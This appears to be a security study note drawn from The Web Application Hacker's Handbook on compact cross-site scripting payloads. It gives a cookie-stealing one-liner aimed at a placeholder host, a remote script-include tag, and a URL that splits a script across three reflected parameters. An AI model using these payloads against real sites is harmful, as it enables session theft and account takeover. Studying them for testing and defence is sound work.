# Compact Payloads

## What it is

These notes focus on very short payloads and on splitting an attack across multiple reflected locations.

## When it applies

Use these when individual input locations have tight length restrictions or when multiple controlled values appear on the same response page.

## Example

### Short payloads

If you are injecting into an existing script, the following 28-byte command transmits the user's cookies to the server with hostname `a`:

```javascript
open("//a/"+document.cookie)
```

If you are injecting straight into HTML, the following 30-byte tag loads and executes a script from the server with hostname `a`:

```html
<script src=http://a></script>
```

### Spanning a payload across multiple locations

Consider the following URL:

```text
https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal
```

It returns:

```html
<input type="hidden" name="page_id" value="244">
<input type="hidden" name="seed" value="129402931">
<input type="hidden" name="mode" value="normal">
```

Suppose that each field has length restrictions, such that no feasible attack string can be inserted into any of them. Nevertheless, you can still deliver a working exploit by using the following URL to span a script across the three locations you control:

```text
https://myapp.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*/</script>
```

When the parameter values from this URL are embedded into the page, the result is:

```html
<input type="hidden" name="page_id" value=""><script>/*">
<input type="hidden" name="seed" value="*/alert(document.cookie);/*">
<input type="hidden" name="mode" value="*/</script>">
```

The resulting HTML is valid and is equivalent to only the portions in bold in the original note. The chunks of source code in between have effectively become JavaScript comments (surrounded by the `/*` and `*/` markers), so the browser ignores them. Hence, your script is executed just as if it had been inserted whole at one location within the page.

## Notes

The short-payload examples came from a separate root file and fit better alongside the split payload notes than as a standalone top-level page.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 12639-12646, 12678-12682). Wiley. Kindle Edition.
